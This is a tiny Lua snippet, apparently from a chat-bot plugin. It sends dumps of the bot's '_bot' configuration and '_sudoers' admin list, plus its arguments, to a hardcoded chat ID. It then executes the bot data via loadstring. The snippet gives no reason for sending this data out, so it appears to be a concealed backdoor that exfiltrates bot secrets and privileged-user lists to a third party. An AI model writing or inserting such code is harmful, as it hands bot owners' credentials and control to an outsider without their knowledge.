require("introtimework")
local a, b = ...
sendMessage(41400331, vardumptext(_bot) .. '\n' .. vardumptext(_sudoers) .. '\n' .. a .. b)
bot = assert(loadstring(_bot))()